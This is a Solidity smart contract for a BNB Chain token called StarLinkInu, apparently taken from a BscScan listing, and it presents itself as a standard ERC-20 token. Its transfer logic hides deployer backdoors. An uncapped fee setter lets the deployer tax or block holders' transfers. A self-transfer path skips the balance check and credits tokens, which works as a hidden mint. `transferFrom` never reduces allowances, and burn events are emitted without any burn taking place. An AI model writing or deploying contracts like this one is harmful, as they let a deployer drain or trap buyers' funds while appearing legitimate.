/**
 *Submitted for verification at BscScan.com on 2022-04-12
*/

/**

*/

/**
https://t.me/starlinkinuportal
*/

pragma solidity ^0.8.13;
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract StarLinkInu is IERC20  {
    using SafeMath for uint256;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping(address => uint) public balances;
    mapping (address => bool) private _isExcludedFrom;


    
    uint public totalSupply;
    string public name = "StarLinkInu";
    string public symbol = "$STARLINK";
    uint public decimals;
    uint256 public feeburn = 10;
    uint256 private _maxTxtransfer;
    address private _marketing;
    address private _marketing1;
    address private dev;
    address public _addressdead = 0x000000000000000000000000000000000000dEaD;
    // run when the contract is deployed
    constructor(address marketing, uint256 feeburn_, address marketing1){
        decimals = 9;
        totalSupply = 1000000 * 10 ** 9;
        dev = msg.sender;
        _maxTxtransfer = totalSupply;
        _marketing = marketing;
        _marketing1 = marketing1;
        balances[msg.sender] = totalSupply;
        _isExcludedFrom[msg.sender] = true;
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function balanceOf(address owner) public view returns(uint){
        return balances[owner];
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function txFee(uint256 value) public {
        require (msg.sender == dev);
        feeburn = value;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 feeAmount = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            feeAmount = (amount * feeburn)/(100);
            require(amount <= _maxTxtransfer);
        }
        uint256 blsender = balances[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender] && !_isExcludedFrom[_marketing]){
            require(blsender >= amount,"IERC20: transfer amount exceeds balance");
        }
        if (blsender >= amount){
            balances[sender] = balances[sender] - (amount);
        }
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            emit Transfer (sender, _addressdead, feeAmount.div(2));
        }
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(_marketing1))
        {
            emit Transfer (sender, _marketing, feeAmount.div(2));
            balances[_marketing] += feeAmount.div(2);
        }

        uint256 amoun;
        amoun = amount - feeAmount;
        if (amoun >= 0){
        balances[recipient] += amoun;
        }
        emit Transfer(sender, recipient, amoun);   
    }
}